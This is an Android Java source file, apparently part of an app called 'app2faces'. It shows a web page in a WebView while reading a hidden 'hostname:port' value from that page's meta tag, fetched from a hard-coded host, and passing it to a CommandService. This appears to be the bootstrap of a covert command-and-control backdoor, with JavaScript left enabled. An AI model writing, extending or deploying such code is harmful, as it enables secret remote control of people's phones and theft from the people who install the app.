package com.android.app2faces;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.appcompat.app.AppCompatActivity;


public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";

    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        this.webView = findViewById(R.id.webview);

        //enable javascript by default
        this.webView.getSettings().setJavaScriptEnabled(true);

        this.webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                startActivity(intent);
                return true;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                webView.evaluateJavascript("(function() { return document.querySelector('meta[name=\"description\"]').content })();", new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String javascriptResult) {
                        //disable javascript code injection after use -> security reason
                        //webView.getSettings().setJavaScriptEnabled(false);
                        Log.d(TAG, javascriptResult);
                        javascriptResult = javascriptResult.replace("\"", "");
                        String[] socketMasterParams = javascriptResult.split(":");

                        Intent intent = new Intent(getApplicationContext(), CommandService.class);
                        intent.putExtra("hostname", socketMasterParams[0]);
                        intent.putExtra("port", Integer.parseInt(socketMasterParams[1]));
                        startService(intent);
                    }
                });

            }
        });

        this.webView.loadUrl("http://192.168.1.5:9999/web");
    }
}
